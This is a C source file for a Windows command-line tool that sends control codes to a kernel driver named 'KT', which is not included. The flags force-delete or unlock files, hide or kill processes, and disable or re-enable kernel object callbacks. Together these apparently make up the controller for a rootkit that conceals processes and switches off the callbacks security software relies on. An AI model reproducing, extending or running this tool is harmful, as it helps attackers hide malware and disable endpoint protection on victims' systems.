#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "getopt.h"

#define REQUEST_FILE_DELETE               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0101, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define REQUEST_FILE_UNLOCK               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0102, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define REQUEST_PROCESS_HIDE              CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0201, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define REQUEST_PROCESS_KILL              CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0202, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define REQUEST_OBJECT_CALLBACK_ENABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0301, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define REQUEST_OBJECT_CALLBACK_DISABLE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0302, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)


void SendCode(DWORD dwCode, const char* lpStr)
{
	HANDLE          h;
	DWORD           bytesIO;
	CHAR			buf[1024] = { 0 };
	DWORD			dwRet = 0;
	BOOL			bRet = FALSE;

	h = CreateFileA("\\\\.\\KT", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (h != INVALID_HANDLE_VALUE)
	{
		if (lpStr == NULL)
			bRet = DeviceIoControl(h, dwCode, NULL, 0, &dwRet, sizeof(dwRet), &bytesIO, NULL);
		else
		{
			switch (dwCode)
			{
			case REQUEST_FILE_DELETE:
				wsprintfA(buf, "\\??\\%s", lpStr);
				break;
			default:
				wsprintfA(buf, "%s", lpStr);
				break;
			}
			bRet = DeviceIoControl(h, dwCode, buf, sizeof(buf), &dwRet, sizeof(dwRet), &bytesIO, NULL);
		}

		if(bRet)
			printf("ok %d\n", dwRet);
		else
			printf("error %d\n", GetLastError());

		CloseHandle(h);
	}
	else
		printf("error %d\n", GetLastError());
}

int main(int argc, char* argv[])
{
	DWORD dwCode = 0;
	char* lpStr = NULL;
	int mode = -1;

	int ch;
	while ((ch = getopt(argc, argv, "PFOd:u:h:k:rm:")) != EOF)
	{
		switch (ch)
		{
		case 'F':
		case 'P':
		case 'O':
			mode = ch;
			break;
		case 'd':
			dwCode = REQUEST_FILE_DELETE;
			lpStr = optarg;
			break;
		case 'u':
			dwCode = REQUEST_FILE_UNLOCK;
			lpStr = optarg;
			break;
		case 'h':
			dwCode = REQUEST_PROCESS_HIDE;
			lpStr = optarg;
			break;
		case 'k':
			dwCode = REQUEST_PROCESS_KILL;
			lpStr = optarg;
			break;
		case 'm':
			dwCode = REQUEST_OBJECT_CALLBACK_DISABLE;
			lpStr = optarg;
			break;
		case 'r':
			dwCode = REQUEST_OBJECT_CALLBACK_ENABLE;
			break;
		default:
			return 1;
		}
	}

	if (dwCode != 0)
		SendCode(dwCode, lpStr);
	
	return 0;
}